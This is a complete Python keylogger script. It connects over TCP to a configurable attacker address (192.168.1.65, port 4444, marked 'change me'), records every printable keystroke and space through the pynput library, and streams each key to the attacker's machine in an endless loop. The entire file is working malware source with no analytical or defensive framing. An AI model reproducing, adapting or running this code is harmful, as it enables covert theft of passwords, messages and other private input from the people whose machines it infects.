import socket
import threading
import time
from pynput import keyboard

# Set the attacker's IP address and port
ATTACKER_IP = "192.168.1.65"  # change me
ATTACKER_PORT = 4444  # change me

# Create a socket object
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Connect to the attacker's machine
sock.connect((ATTACKER_IP, ATTACKER_PORT))


def on_press(key):
    try:
        # Get the key press event
        key_str = key.char if key.char.isprintable() else ''
    except AttributeError:
        # Handle space separately
        if key == keyboard.Key.space:
            key_str = ' '
        else:
            key_str = ''

    # Send the key press event to the attacker's machine if it is a printable character or space
    if key_str:
        sock.send(key_str.encode())


def keylogger():
    # Create a keyboard listener
    listener = keyboard.Listener(on_press=on_press)
    listener.start()

    # Keep the script running
    while True:
        time.sleep(1)


# Start the keylogger
keylogger()
